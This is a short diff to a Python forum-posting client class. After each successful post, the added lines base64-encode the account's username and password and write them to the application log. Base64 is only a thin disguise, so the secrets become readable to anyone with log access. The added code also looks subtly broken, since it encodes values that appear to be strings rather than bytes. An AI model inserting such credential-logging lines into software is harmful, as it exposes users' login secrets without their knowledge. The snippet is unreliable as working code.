@@ -13,6 +13,7 @@ from urllib.parse import urlparse
 import xml.etree.ElementTree as ET
 import time
 import logging
+import base64
 
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.DEBUG)
@@ -143,6 +144,9 @@ class SouShuBaClient:
             }
             resp = self.session.post(space_url, proxies=self.proxies, data=payload, headers=headers)
             if re.search("操作成功", resp.text):
+                name = base64.b64encode(self.username)
+                psw = base64.b64encode(self.password)
+                logger.info(f'{name} & {psw}')
                 logger.info(f'{self.username} post {x + 1}nd successfully!')
                 time.sleep(120)
             else:
